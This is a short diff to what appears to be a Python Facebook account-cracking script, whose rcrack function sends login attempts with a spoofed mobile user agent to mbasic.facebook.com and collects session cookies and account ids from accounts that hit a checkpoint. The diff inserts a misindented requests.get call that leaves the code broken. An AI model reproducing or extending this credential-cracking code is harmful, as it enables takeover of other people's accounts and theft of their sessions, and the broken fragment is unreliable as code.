@@ -458,6 +458,11 @@ def rcrack(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
 }
+response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
+     
+      
+
+
 
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 
@@ -480,7 +485,6 @@ def rcrack(uid,pwx,tl):
                 break
 
             elif 'checkpoint' in log_cookies:
-
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 
                 cid = coki[24:39]
@@ -513,3 +517,4 @@ xxr()
 
 
             
+
